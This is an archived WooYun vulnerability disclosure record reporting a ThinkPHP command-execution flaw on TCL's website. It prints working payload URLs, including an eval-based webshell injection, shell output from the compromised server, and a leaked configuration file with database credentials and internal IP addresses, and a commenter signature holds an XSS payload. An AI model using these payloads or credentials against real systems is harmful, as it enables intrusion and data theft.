{"id": 3579, "wybug_id": "wooyun-2014-058929", "wybug_title": "TCL官网命令执行导致getshell（可内网，附赠信息泄漏一枚）", "wybug_corp": "TCL官方网上商城", "wybug_author": "Mody", "wybug_date": "2014-04-30 19:45", "wybug_open_date": "2014-06-14 19:45", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄漏", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向公众公开  简要描述： 如题 详细说明：  1. 主站命令执行是thinkphp的命令执行漏洞，这么久了还没修复，维护人员该打pp了http://www.tcl.com/new/1735.html/abc/abc/abc/${@phpinfo()}直接http://www.tcl.com/new/1735.html/abc/abc/abc/$%7B@print(eval($_POST[c]))%7D  getshell来张图\n\n内网信息\n[/var/www/html/tcl/]$ whoamiapache[/var/www/html/tcl/]$ ifconfigeth0      Link encap:Ethernet  HWaddr 00:1B:21:BA:99:B0            UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)eth1      Link encap:Ethernet  HWaddr 00:1B:21:BA:99:B2            UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)eth2      Link encap:Ethernet  HWaddr 40:F2:E9:29:38:D2            inet addr:10.4.22.72  Bcast:10.4.255.255  Mask:255.255.0.0          inet6 addr: fe80::42f2:e9ff:fe29:38d2/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:291345943 errors:0 dropped:0 overruns:0 frame:0          TX packets:420280104 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:56145622678 (52.2 GiB)  TX bytes:489393736613 (455.7 GiB)          Memory:91580000-915a0000\n   漏洞证明：  内网敏感信息泄漏翻下目录，发现了内网好多信息1. n多数据库账户密码泄漏\n<?phpswitch($_SERVER[\"HTTP_HOST\"]) {\tcase \"localhost:8080\": {   //本机\t\t$db_host = \"localhost\";\t\t$db_name = \"tcl\";\t\t$db_user = 'root';\t\t$db_pass = 'root';\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = false;\t\tbreak;\t}\tcase \"10.4.21.23\": {   //测试\t\t$db_host = \"10.4.21.20\";\t\t$db_name = \"tcl\";\t\t$db_user = 'tcladmin';\t\t$db_pass = '123456';\t\t$db_host_en = \"10.4.21.20\";\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = false;\t\tbreak;\t}\tcase \"10.4.21.24\": {   //测试2\t\t$db_host = \"10.4.21.20\";\t\t$db_name = \"tcl\";\t\t$db_user = 'tcladmin';\t\t$db_pass = '123456';\t\t$db_host_en = \"10.4.21.20\";\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = false;\t\tbreak;\t}\tcase \"10.4.22.72\": {   //正式\t\t$db_host = \"10.4.22.71\";\t\t$db_name = \"tcl\";\t\t$db_user = 'tcl_admin';\t\t$db_pass = 'zpw@8b!gurvu';\t\t$db_host_en = \"10.4.22.71\";\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = false;\t\tbreak;\t}\tcase \"10.4.22.73\": {   //正式2\t\t$db_host = \"10.4.22.71\";\t\t$db_name = \"tcl\";\t\t$db_user = 'tcl_admin';\t\t$db_pass = 'zpw@8b!gurvu';\t\t$db_host_en = \"10.4.22.71\";\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = false;\t\tbreak;\t}\tdefault : {   //正式\t\t$db_host = \"10.4.22.71\";\t\t$db_name = \"tcl\";\t\t$db_user = 'tcl_admin';\t\t$db_pass = 'zpw@8b!gurvu';\t\t$db_host_en = \"10.4.22.71\";\t\t$db_name_en = \"tcl_en\";\t\t$cache_type = \"File\";\t\t$url_model = 2;\t\t$html_cache = false;\t\t$temp_my_cache = true;\t\tbreak;\t}}?>\n2. 附赠子域名站点cvs信息泄漏一枚http://multimedia.tcl.com/cn/investor/CVS/Roothttp://multimedia.tcl.com/CVS/Roothttp://multimedia.tcl.com/en/home/CVS/Root\n:sspi:mars.ho@source.loko-asia.com:2401/cvsdata\n   修复方案：  1. 升级2. 改口令，之前不知道还有人来过没，一定要改3. 给个高rank呗   版权声明：转载请注明来源 Mody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-04-30 22:03 厂商回复： 感谢您的关注，已转交相关单位处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-30 22:49 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  确认好快，赞一个 @TCL官方网上商城    \n     2014-05-21 18:16 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Mody 我擦！这个你是怎么发现的？    \n     2014-05-21 19:14 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  大神，我用的yascanner    \n     2014-05-21 19:15 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @U神 楼上    \n     2014-05-21 19:18 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Mody 求共享    \n     2014-05-21 22:00 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @U神 https://www.yascanner.com/#!/    \n     2014-05-21 22:01 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @U神 https://www.yascanner.com/#!/    \n     2014-05-22 12:21 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  依然没修复？？？？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}